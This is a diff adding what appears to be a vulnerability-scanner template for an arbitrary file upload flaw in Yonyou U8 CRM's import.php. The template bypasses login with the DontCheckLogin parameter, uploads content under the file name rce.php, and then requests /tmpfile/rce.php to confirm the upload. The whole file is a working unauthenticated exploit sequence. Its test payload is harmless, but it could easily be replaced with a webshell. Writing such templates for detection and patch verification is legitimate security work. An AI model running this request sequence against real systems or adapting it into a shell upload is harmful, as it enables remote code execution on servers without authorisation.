@@ -1,0 +1,36 @@
+id:
+
+info:
+  name: 用友U8 CRM import.php 文件上传致RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5
+  data: |
+    ------WebKitFormBoundarye0z8QbHs79gL8vW5
+    Content-Disposition: form-data; name="xfile"; filename="1.xls"
+
+    12345
+    ------WebKitFormBoundarye0z8QbHs79gL8vW5
+    Content-Disposition: form-data; name="combo"
+
+    rce.php
+    ------WebKitFormBoundarye0z8QbHs79gL8vW5--
+response1:
+requests2:
+  method: GET
+  path: /tmpfile/rce.php
+  headers:
+response2:
+  body: 123
+  code: 200
